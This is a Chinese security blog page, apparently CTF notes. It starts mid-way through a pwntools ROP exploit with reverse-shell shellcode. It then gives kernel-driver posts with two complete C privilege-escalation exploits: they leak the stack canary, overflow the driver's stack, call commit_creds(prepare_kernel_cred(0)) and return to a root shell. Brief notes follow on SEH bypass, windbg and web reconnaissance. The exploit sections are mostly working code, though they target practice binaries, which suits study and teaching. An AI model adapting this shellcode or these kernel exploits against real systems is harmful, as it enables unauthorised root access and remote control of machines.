class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/两道内核/">驱动漏洞</a></h1>
  

    </header>
    <div class="entry">
      
        <p>确定结构大小：写个驱动输出</p>
<p>86 eax edx ecx</p>
<p>64 edi esi edx</p>
<p>起qemu</p>
<p>qemu-system-i386 -kernel bzImage -initrd rootfs.img.gz -append “root=/dev/ram rdinit=/sbin/init”</p>
<p>qemu-system-x86_64 -s-enable-kvm -cpu kvm64,+smep -m 64M </p>
<p>-kernel ./bzImage -initrd ./rootfs.cpio </p>
<p>-append “root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr” </p>
<p>-smp cores=2,threads=1,sockets=1 -monitor /dev/null -nographic 2&gt;/dev/null</p>
<p>编译</p>
<p>gcc muhe_test_syscall_lib.c -o muhe -static</p>
<p>查提权地址</p>
<p>/ <em># grep commit_creds /proc/kallsyms</em></p>
<p>c11b7bc0 T security_commit_creds</p>
<p>c15f8ed0 r __ksymtab_commit_creds</p>
<p>c16024d0 r __kcrctab_commit_creds</p>
<p>c1609215 r __kstrtab_commit_creds</p>
<p>/ <em># grep prepare_kernel_cred /proc/kallsyms</em></p>
<p>c1067fc0 T prepare_kernel_cred</p>
<p>c15f8eb0 r __ksymtab_prepare_kernel_cred</p>
<p>c16024c0 r __kcrctab_prepare_kernel_cred</p>
<p>c16091d9 r __kstrtab_prepare_kernel_cred</p>
<p>1 调试注意事项</p>
<p>模块在编译后按照上篇文章的方法，丢进busybox，然后qemu起内核然后调试。</p>
<p>由于模块并没有作为vmlinux的一部分传给gdb，因此必须通过某种方法把模块信息告知gdb，可以通过add-symbol-file命令把模块的详细信息告知gdb，由于模块也是一个elf文件，需要知道模块的.text、.bss、.data节区地址并通过add-symbol-file指定。</p>
<p>模块stack_smashing.ko的这三个信息分别保存在/sys/module/stack_smashing/sections/.text、/sys/module/stack_smashing/sections/.bss和/sys/module/stack_smashing/sections/.data，由于stack_smashing模块没有bss、data节区所以只需要指定text即可。</p>
<p>2 调试过程</p>
<p>qemu 中设置好gdbserver后，找到模块的.text段的地址grep 0 /sys/module/stack_smashing/sections/.text。</p>
<p>然后gdb里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$gdb vmlinux</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">gdb-peda$ target remote :1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">Warning: not running or target is remote</span><br><span class="line">current_thread_info () at /home/muhe/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/arch/x86/include/asm/thread_info.h:186</span><br><span class="line">186            (current_stack_pointer &amp; ~(THREAD_SIZE - 1));</span><br><span class="line">gdb-peda$ add-symbol-file ./stack_smashing/stack_smashing.ko 0xc8830000</span><br><span class="line">add symbol table from file &quot;./stack_smashing/stack_smashing.ko&quot; at</span><br><span class="line">    .text_addr = 0xc8830000</span><br><span class="line">Reading symbols from ./stack_smashing/stack_smashing.ko...done.</span><br><span class="line">gdb-peda$ b bug2_write</span><br><span class="line">Breakpoint 1 at 0xc8830000: file /home/muhe/linux_kernel/linux-2.6.32.1/linux-2.6.32.1/stack_smashing/stack_smashing.c, line 7.</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure>
<p>文件解包打包</p>
<p>要向系统中添加文件，就需要解包cpio文件，将文件放到目录中再打包：</p>
<table>
<thead>
<tr>
<th><code>123456789101112</code></th>
<th>`$ file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix$ mv rootfs.cpio rootfs.cpio.gz$ gunzip rootfs.cpio.gz$ file rootfs.cpio rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)$ cpio -idmv &lt; rootfs.cpio// 解包完成，可以向目录中添加文件$ lsbin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr// 重新打包，不需要压缩也可以$ find .</th>
<th>cpio -o –format=newc &gt; ../rootfs.cpio`</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>$ cat /proc/modules<br>pci_stub 12623 1 - Live 0x0000000000000000<br>vboxpci 23237 0 - Live 0x0000000000000000 (O)</p>
<p><strong>无法正确显示加载地址</strong></p>
<p>查了一下，是由于权限的问题。</p>
<p>在/proc/sys/kernel/kptr_restrict的值为1的情况下，加上 sudo 就好了。</p>
<p>还有一种办法是把/proc/sys/kernel/kptr_restrict设置成０即可。</p>
<p>$ sudo cat /proc/modules<br>pci_stub 12623 1 - Live 0xffffffffa0466000<br>vboxpci 23237 0 - Live 0xffffffffa04fb000 (O)</p>
<p><strong>注册结构x64</strong></p>
<p>struct file_operations {</p>
<p>  struct module *owner;</p>
<p>  loff_t(<em>llseek) (struct file </em>, loff_t, int);</p>
<p>  ssize_t(<em>read) (struct file </em>, char __user <em>, size_t, loff_t </em>);</p>
<p>  ssize_t(<em>aio_read) (struct kiocb </em>, char __user *, size_t, loff_t);</p>
<p>  ssize_t(<em>write) (struct file </em>, const char __user <em>, size_t, loff_t </em>);</p>
<p>  ssize_t(<em>aio_write) (struct kiocb </em>, const char __user *, size_t, loff_t);</p>
<p>  int (<em>readdir) (struct file </em>, void *, filldir_t);</p>
<p>  unsigned int (<em>poll) (struct file </em>, struct poll_table_struct *);</p>
<p>  int (<em>ioctl) (struct inode </em>, struct file *, unsigned int, unsigned long);//偏移0x48</p>
<p>  int (<em>mmap) (struct file </em>, struct vm_area_struct *);</p>
<p>  int (<em>open) (struct inode </em>, struct file *);</p>
<p>  int (<em>flush) (struct file </em>);</p>
<p>  int (<em>release) (struct inode </em>, struct file *);</p>
<p>  int (<em>fsync) (struct file </em>, struct dentry *, int datasync);</p>
<p>  int (<em>aio_fsync) (struct kiocb </em>, int datasync);</p>
<p>  int (<em>fasync) (int, struct file </em>, int);</p>
<p>  int (<em>lock) (struct file </em>, int, struct file_lock *);</p>
<p>  ssize_t(<em>readv) (struct file </em>, const struct iovec <em>, unsigned long, loff_t </em>);</p>
<p>  ssize_t(<em>writev) (struct file </em>, const struct iovec <em>, unsigned long, loff_t </em>);</p>
<p>  ssize_t(<em>sendfile) (struct file </em>, loff_t <em>, size_t, read_actor_t, void __user </em>);</p>
<p>  ssize_t(<em>sendpage) (struct file </em>, struct page <em>, int, size_t, loff_t </em>, int);</p>
<p>  unsigned long (<em>get_unmapped_area) (struct file </em>, unsigned long,</p>
<p>​         unsigned long, unsigned long,</p>
<p>​         unsigned long);</p>
<p>};</p>
<p><strong>ROP操作</strong></p>
<p>目标：用户空间中伪造内核栈，执行内核空间的ROP链，即在用户空间内执行内核rop gadgets提权。</p>
<p>ROP chain（x86_64)：</p>
<p><img src="https://blog.spiderlabs.com/.a/6a0133f264aa62970b01b8d1f511f2970c-800wi" alt="Rop_chain"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>4.准备Gadget(用extract-vmlinux提取elf镜像，ROPgadget寻找gadget）：</p>
<p>​    1)sudo file /boot/vmlinuz*</p>
<p>​    2)sudo ./extract-vmlinux /boot/vmlinuz* &gt; vmlinux</p>
<p>​    3)ROPgadget.py –binary ./vmlinux &gt; ~/ropgadget.txt</p>
<p>​    4)grep ‘: pop rdi ; ret’ ropgadget.txt</p>
<p>5.导入有漏洞的内核模块，dmesg查看加载路径：</p>
<p>xor %eax,%eax<strong>call</strong> 0xc1067fc0<strong>call</strong> 0xc1067e20ret</p>
<p>kvm虚拟化错误解决</p>
<p>这里需要提的一点是很多人都是虚拟机里的Linux安装的qemu,这里有可能会报一个KVM的错误,这里需要开启虚拟机/宿主机的虚拟化功能。</p>
<p><img src="http://aliyunzixunbucket.oss-cn-beijing.aliyuncs.com/jpg/0a947e4975ce7009867af6a60fb24f99.jpg?x-oss-process=image/resize,p_100/auto-orient,1/quality,q_90/format,jpg/watermark,image_eXVuY2VzaGk=,t_100,g_se,x_0,y_0" alt="NCSTISC Linux Kernel PWN450 Writeup"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>启动后我们可以进入当前系统,如果要调试的话,我们需要在qemu启动脚本里加一条参数-gdb tcp::1234 -S,这样系统启动时会挂起等待gdb连接,进入gdb,通过命令</p>
<p>Target remote localhost:1234 </p>
<h2 id="内核提权常用地址获取方法"><a href="#内核提权常用地址获取方法" class="headerlink" title="内核提权常用地址获取方法"></a>内核提权常用地址获取方法</h2><p>#define <strong>THREAD_SIZE</strong>     (8192)</p>
<p>注：<br>(1)THREAD_SIZE(8K)即thread_info结构体的大小<br>(2)”andl %%esp,%0; “:”=r” (ti) : “0” (~(THREAD_SIZE - 1))<br>将内核堆栈栈顶ESP指针和(~(THREAD_SIZE - 1)相与：获得的结果为内核堆栈最底端地址(也就是结构体thread_info的地址)</p>
<p>//获取task_struct中cred的结构的地址</p>
<p>#include &lt;linux/kernel.h&gt;</p>
<p>#include &lt;linux/module.h&gt;</p>
<p>#include &lt;linux/init.h&gt;</p>
<p>#include &lt;linux/slab.h&gt;</p>
<p>#include &lt;linux/kthread.h&gt;</p>
<p>#include &lt;linux/errno.h&gt;</p>
<p>#include &lt;linux/types.h&gt;<br>int init_module()<br>{<br>    printk(“[!]current cred offset:%lx”,((unsigned long)&amp;(current-&gt;cred)-(unsigned long)current));<br>    return 0;<br>}<br>void cleanup_module()<br>{<br>    printk(“module cleanup”);</p>
<p>}</p>
<p>//uid偏移地址 </p>
<p>#define UID_OFFSET 4</p>
<h2 id="X64-core："><a href="#X64-core：" class="headerlink" title="X64 core："></a>X64 core：</h2><p>驱动漏洞解压后发现core.ko驱动 </p>
<p><img src="file:///C:\Users\HP\AppData\Local\Temp\msohtmlclip1\01\clip_image002.jpg" alt="img"></p>
<p>Ioctl驱动控制函数中，core_read函数读取buf偏移off值的64个字节，第二个功能指定off，所以可以泄露地址，内核栈上cancry(rbp前)和kaslr(rbp后尾数为78的地址为内核地址)可以被破解。</p>
<p><em>grep commit_creds /proc/kallsyms</em></p>
<p>qemu中输入上述指令查看函数地址算出相对偏移，破解kaslr  canary类似用户态直接记录。</p>
<p>Core_write将用户态数据写入name</p>
<p>Loctl第三个功能将name内容写入栈中造成栈溢出</p>
<p>然后由于没开semp所以可以直接覆盖ret的rip跳入用户态中，执行之前泄露的</p>
<p>commit_creds(prepare_kernel_cred(0));</p>
<p>程序成为root权限</p>
<p>在此之后执行</p>
<p>   asm(</p>
<p>“mov $tf,%rsp;”</p>
<p>“swapgs;”</p>
<p>“iretq;”);</p>
<p>将内核栈转换为之前准备好的内存中调用iretq返回用户态的launch_shell执行shell成功转变为root</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>#include &lt;unistd.h&gt;</p>
<p>#include &lt;sys/stat.h&gt;</p>
<p>#include &lt;fcntl.h&gt;</p>
<p>#include &lt;string.h&gt;</p>
<p>#include &lt;stdint.h&gt;</p>
<p>#include &lt;sys/ioctl.h&gt;</p>
<p>struct trap_frame{</p>
<p>​    void *rip;</p>
<p>​    uint64_t cs;</p>
<p>​    uint64_t eflags;</p>
<p>​    void *rsp;</p>
<p>​    uint64_t ss;</p>
<p>}<strong>attribute</strong>((packed));</p>
<p>struct trap_frame a[20];</p>
<p>struct trap_frame tf;</p>
<p>void launch_shell(void) </p>
<p>{ </p>
<p>​    system(“/bin/sh\x00”);</p>
<p>}</p>
<p>void save_stats() {</p>
<p> asm(</p>
<p> “movq %%cs, %0;”</p>
<p> “movq %%ss, %1;”</p>
<p> “pushfq;”</p>
<p> “popq %2;”</p>
<p> :”=r”(tf.cs), “=r”(tf.ss), “=r”(tf.eflags)</p>
<p> :</p>
<p> : “memory”</p>
<p> );</p>
<p> tf.rip = &launch_shell;</p>
<p>​    tf.rsp =(void*)0x602864  ;</p>
<p>}</p>
<p>void prepare_tf(void) </p>
<p>{ </p>
<p>return ;</p>
<p>  }</p>
<p>#define KERNCALL <strong>attribute</strong>((regparm(3)))</p>
<p>void<em> (</em>prepare_kernel_cred)(void<em>) KERNCALL = (void</em>) 0xc1067fc0;</p>
<p>void (<em>commit_creds)(void</em>) KERNCALL = (void*) 0xc1067e20;</p>
<p>void payload(void){</p>
<p>​    //payload here</p>
<p>​       </p>
<p>​    commit_creds(prepare_kernel_cred(0));</p>
<p>​    asm(</p>
<p>“mov $tf,%rsp;”</p>
<p>“swapgs;”</p>
<p>“iretq;”);</p>
<p>}</p>
<p>int main(int argc,char *argv[]){</p>
<p>save_stats();</p>
<p>​    int fd = open(“/proc/core”,O_RDWR);</p>
<p>​    if(!fd){</p>
<p>​        printf(“errorn”);</p>
<p>​        exit(1);</p>
<p>​    }</p>
<p>​    char buffer[64] = {0};</p>
<p>ioctl(fd,0x6677889C,32 ) ;</p>
<p>   ioctl(fd,0x6677889B,buffer ) ;</p>
<p>​    int i,j;</p>
<p>​    //memset(buffer,0x41,64);s</p>
<p>​    for(i = 0;i&lt;4;i++){</p>
<p>​        for(j = 0;j&lt;16;j++){</p>
<p>​            printf(“%02x “,buffer[i*16+j] &amp; 0xff);</p>
<p>​        }</p>
<p>​        printf(“ | “);</p>
<p>​        for(j = 0;j&lt;16;j++){</p>
<p>​            printf(“%c”,buffer[i*16+j] &amp; 0xff);</p>
<p>​        }</p>
<p>​        printf(“\n”);</p>
<p>​    }</p>
<p>​    char canary[8] = {0};</p>
<p>​    memcpy(canary,buffer+0x20,8);</p>
<p>​    printf(“CANARY:”);</p>
<p>​    for(i = 0;i&lt;8;i++){</p>
<p>​        printf(“%02x”,canary[i] &amp; 0xff);</p>
<p>​    }</p>
<p>   printf(“\n”);</p>
<p>ioctl(fd,0x6677889C,0x50 ) ;</p>
<p>   ioctl(fd,0x6677889B,buffer ) ;</p>
<p>​    //memset(buffer,0x41,64);s</p>
<p>​    for(i = 0;i&lt;4;i++){</p>
<p>​        for(j = 0;j&lt;16;j++){</p>
<p>​            printf(“%02x “,buffer[i*16+j] &amp; 0xff);</p>
<p>​        }</p>
<p>​        printf(“ | “);</p>
<p>​        for(j = 0;j&lt;16;j++){</p>
<p>​            printf(“%c”,buffer[i*16+j] &amp; 0xff);</p>
<p>​        }</p>
<p>​        printf(“\n”);</p>
<p>​    }</p>
<p>​    char addr[8] = {0};</p>
<p>​    memcpy(addr,buffer+0x10,8);</p>
<p>​    printf(“addr:”);</p>
<p>​    unsigned long long int sum=0;</p>
<p>  for( int i = 7;i&gt;=0;i–)</p>
<p>   {</p>
<p>​       printf(“%02x”,addr[i] &amp; 0xff);</p>
<p>​       sum  = (unsigned long long int)sum*256+(unsigned long long int) (addr[i]);</p>
<p>​       </p>
<p>   }</p>
<p>   printf(“\n”);</p>
<p>sum=sum+0x0101010100010100;</p>
<p> prepare_kernel_cred= (void*)(sum-0X1409F1);</p>
<p>commit_creds=(void*)(sum-0X140DF1);</p>
<p>printf(“%llx”,sum);</p>
<p>  char poc[0x80] = {0};</p>
<p>​    memset(poc,0x41,0x40);</p>
<p>​    memcpy(poc+0x40,canary,8);//set canary</p>
<p>​    *((void**)(poc+0x40+8+8)) = &payload;</p>
<p>​    printf(“[*]payload:%s\n”,poc);</p>
<p>​    write(fd,poc,0x80);</p>
<p>​    </p>
<p>ioctl(fd,1719109786,0xffffffff00000080) ;</p>
<p>​    </p>
<p>   return 0;</p>
<p>}</p>
<h2 id="X86-Exploit"><a href="#X86-Exploit" class="headerlink" title="X86 Exploit"></a>X86 Exploit</h2><p>\1. 编写的exploit代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">struct trap_frame&#123;</span><br><span class="line">    void *eip;</span><br><span class="line">    uint32_t cs;</span><br><span class="line">    uint32_t eflags;</span><br><span class="line">    void *esp;</span><br><span class="line">    uint32_t ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line">void launch_shell(void) </span><br><span class="line">&#123; </span><br><span class="line">    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</span><br><span class="line">&#125;</span><br><span class="line">struct trap_frame tf;</span><br><span class="line">void prepare_tf(void) </span><br><span class="line">&#123; </span><br><span class="line">    asm(&quot;pushl %cs; popl tf+4;&quot;</span><br><span class="line">        &quot;pushfl; popl tf+8;&quot;</span><br><span class="line">        &quot;pushl %esp; popl tf+12;&quot;</span><br><span class="line">        &quot;pushl %ss; popl tf+16;&quot;);</span><br><span class="line">    tf.eip = &amp;launch_shell;</span><br><span class="line">    tf.esp -= 1024;</span><br><span class="line">&#125;</span><br><span class="line">#define KERNCALL __attribute__((regparm(3)))</span><br><span class="line">void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc1067fc0;</span><br><span class="line">void (*commit_creds)(void*) KERNCALL = (void*) 0xc1067e20;</span><br><span class="line">void payload(void)&#123;</span><br><span class="line">    //payload here    </span><br><span class="line">    commit_creds(prepare_kernel_cred(0));</span><br><span class="line">    asm(&quot;mov $tf,%esp;&quot;</span><br><span class="line">       &quot;iret;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc,char *argv[])&#123;</span><br><span class="line">    int fd = open(&quot;/proc/csaw&quot;,O_RDWR);</span><br><span class="line">    if(!fd)&#123;</span><br><span class="line">        printf(&quot;errorn&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd,16,SEEK_CUR);</span><br><span class="line">    char buffer[64] = &#123;0&#125;;</span><br><span class="line">    read(fd,buffer,64);</span><br><span class="line">    int i,j;</span><br><span class="line">    //memset(buffer,0x41,64);</span><br><span class="line">    for(i = 0;i&lt;4;i++)&#123;</span><br><span class="line">        for(j = 0;j&lt;16;j++)&#123;</span><br><span class="line">            printf(&quot;%02x &quot;,buffer[i*16+j] &amp; 0xff);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot; | &quot;);</span><br><span class="line">        for(j = 0;j&lt;16;j++)&#123;</span><br><span class="line">            printf(&quot;%c&quot;,buffer[i*16+j] &amp; 0xff);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    char canary[4] = &#123;0&#125;;</span><br><span class="line">    memcpy(canary,buffer+32,4);</span><br><span class="line">    printf(&quot;CANARY:&quot;);</span><br><span class="line">    for(i = 0;i&lt;4;i++)&#123;</span><br><span class="line">        printf(&quot;%02x&quot;,canary[i] &amp; 0xff);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;n&quot;);</span><br><span class="line">    char poc[84] = &#123;0&#125;;</span><br><span class="line">    memset(poc,0x41,76);</span><br><span class="line">    memcpy(poc+64,canary,4);//set canary</span><br><span class="line">    *((void**)(poc+64+4+4)) = &amp;payload;</span><br><span class="line">    printf(&quot;[*]payload:%sn&quot;,poc);</span><br><span class="line">    printf(&quot;Triger bug:n&quot;);</span><br><span class="line">    //init tf struct;</span><br><span class="line">    prepare_tf();</span><br><span class="line">    write(fd,poc,76);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/windows机制/">windows机制</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="seh机制"><a href="#seh机制" class="headerlink" title="seh机制"></a>seh机制</h2><pre><code>seh是异常处理程序在eip下方，为单向链表
一直到最后一个函数
sehsafe是windows后加的安全机制
通过检测seh函数地址是否为预先设定的地址来防止溢出
但 没开启sehsafe的函数 加载模块之外的地方 堆区均可无视sehsafe 
可以利用这个特点进行绕过 
sehop检测链表最后一个函数是不是默认处理函数可以伪造链表绕过
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/windbg学习总结/">windbg学习总结</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="无法正确输出地址问题"><a href="#无法正确输出地址问题" class="headerlink" title="无法正确输出地址问题"></a>无法正确输出地址问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ReadMemory error for address eeddccee</span><br><span class="line">Use `!address eeddccee&apos; to check validity of the address.</span><br></pre></td></tr></table></figure>
<h1 id="无法正确断下点问题"><a href="#无法正确断下点问题" class="headerlink" title="无法正确断下点问题"></a>无法正确断下点问题</h1><pre><code>address命令正确的指示了该地址为私有堆内存，但该内存页不可访问。
检查注册表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options，确定已经正确的设置了，
尝试其他多种设置，甚至换工具进行设置，但结依然如此。
难道是机器问题？于是在win732位机器上重复上述过程，
发现是可以正确的打印出堆内存指针被释放的栈回溯的。
但更换其他xp机器依然不能正确显示。
&quot;CTEST* pCTest = new CTEST(); &quot;的栈回溯几率，
即申请堆内存的记录，但始终未找到释放堆内存的记录。
于是再次怀疑xp下的页堆并没有真正启动或启动是有问题的，
于是检查下页堆启动情况：
“ReadMemory error for address eeddccee”，  
且只展示一个Page Heap句柄了，剩下的未展示完全，
但页堆明明白白的现实已经开启，也有了准页堆，
但数据却显示不出来，说明数据可能被破坏，
但测试代码如此简单，而且也被windbg第一时间断下，
不可能去破坏数据，换成6.6.0007.5版即可解决。
试了下果然在xp下顺利输出了用户态栈回溯。
Win7下的 _STACK_TRACE_DATABASE 结构和xp下并不完全相同，
关键的 Buckets（栈回溯记录）的结构偏移改了，
而且原xp下是个数组，但win7下却变成了链表，
故猜测高版本的Windbg在xp下依然使用了win7下的某些数据结构，
从而导致Windbg解析出了问题。
</code></pre><h2 id="无法正确下堆断点"><a href="#无法正确下堆断点" class="headerlink" title="无法正确下堆断点"></a>无法正确下堆断点</h2><pre><code>peb错误
输入如下代码
就可以！gflag
</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.sympath srv*C:\symblol*http://msdl.microsoft.com/download/symbols </span><br><span class="line">.reload</span><br></pre></td></tr></table></figure>
<h2 id="active控件分析方法"><a href="#active控件分析方法" class="headerlink" title="active控件分析方法"></a>active控件分析方法</h2><pre><code>alt+e进入oleaut32
ctrl+n 找到DISPCALLFUNC
找到首个 call ecx
</code></pre>
      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>





  <article class="post">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
     
      
      
  
    <h1 class="title"><a href="/2018/10/21/web/">随意码的web</a></h1>
  

    </header>
    <div class="entry">
      
        <p>信息收集</p>
<p>.git</p>
<p>.svn</p>
<p>.robots.txt</p>
<p>.swp vim的暂存</p>
<p>压缩文件</p>
<p>php</p>
<p>变量覆盖</p>
<p>extract()</p>
<p>$$k</p>
